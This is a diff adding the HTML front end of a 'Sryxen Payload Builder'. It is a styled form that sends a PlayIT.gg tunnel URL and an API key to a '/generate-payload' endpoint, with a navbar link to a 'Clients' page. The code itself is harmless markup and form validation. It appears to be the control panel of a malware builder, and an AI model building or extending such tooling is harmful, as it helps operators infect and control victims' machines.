@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Builder</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: url('images/bg.png');
+            background-repeat: no-repeat;
+            background-size: cover;
+            background-color: #000;
+            color: #fff;
+            font-family: 'Montserrat', sans-serif;
+            width: 100%;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        body::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.79);
+            z-index: -2;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: url('images/bg_pattern.png');
+            z-index: -1;
+            animation: backgroundPanel_anim 1000s linear infinite;
+        }
+
+        @keyframes backgroundPanel_anim {
+            0% {
+                background-position-x: 0;
+            }
+            25%, 50%, 75% {
+                background-position-x: 3000px;
+            }
+            100% {
+                background-position-x: 0;
+            }
+        }
+
+        .navbar {
+            background: linear-gradient(135deg, #00000042, #120522ef);
+            backdrop-filter: blur(10px);
+            color: white;
+            width: 100%;
+            max-width: 450px;
+            display: flex;
+            justify-content: center;
+            padding: 0.8rem 1.5rem;
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            gap: 2rem;
+            opacity: 0;
+            animation: fadeIn 1s ease forwards;
+            border: 3px solid #9b5ded;
+            background-color: rgba(0, 0, 0, 0.26);
+        }
+
+        .navbar a {
+            color: white;
+            text-decoration: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease, transform 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 1rem;
+        }
+
+        .navbar a:hover {
+            background: linear-gradient(135deg, #5e076686, #9b5ded71);
+            color: #fff;
+            transform: translateY(-3px);
+            text-decoration: none;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        h1 {
+            color: #fff;
+            font-size: 2rem;
+            margin-bottom: 20px;
+        }
+
+        .form {
+            background: linear-gradient(135deg, #5e076600, #9b5ded00);
+            border: 3px solid transparent;
+            padding: 20px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            border: 3px solid #9b5ded;
+            background-color: rgba(0, 0, 0, 0.26); 
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        input[type="text"], input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        input[type="submit"] {
+            background: linear-gradient(135deg, #5e076686, #9b5ded71);
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background: linear-gradient(135deg, #5e0766, #9b5ded);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes backgroundPanel_anim {
+            0% {
+                background-position-x: 0;
+            }
+            25%, 50%, 75% {
+                background-position-x: 3000px;
+            }
+            100% {
+                background-position-x: 0;
+            }
+        }
+
+    </style>
+</head>
+<body>
+    <div class="navbar">
+        <a href="/"><i class="fas fa-home"></i> Home</a>
+        <a href="/clients"><i class="fas fa-users"></i> Clients</a>
+    </div>
+
+    <div class="container">
+        <h1>Sryxen Payload Builder</h1>
+        <form class="form" id="builderForm" action="/generate-payload" method="POST">
+            <label for="url">Enter PlayIT.gg URL:</label>
+            <input type="text" id="url" name="url" placeholder="https://playit.gg/..." required>
+            
+            <label for="apiKey">API Key:</label>
+            <input type="text" id="apiKey" name="apiKey" placeholder="API Key" required>
+            
+            <input type="submit" value="Generate Payload">
+        </form>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const urlInput = document.getElementById("url");
+
+            urlInput.addEventListener("blur", () => {
+                let urlValue = urlInput.value.trim();
+                if (urlValue && !urlValue.startsWith("http://") && !urlValue.startsWith("https://")) {
+                    urlInput.value = "https://" + urlValue;
+                }
+            });
+        });
+
+        document.getElementById("builderForm").addEventListener("submit", (e) => {
+            const url = document.getElementById("url").value.trim();
+            const apiKey = document.getElementById("apiKey").value.trim();
+
+            if (!url || !apiKey) {
+                alert("Please fill in both the URL and API Key.");
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
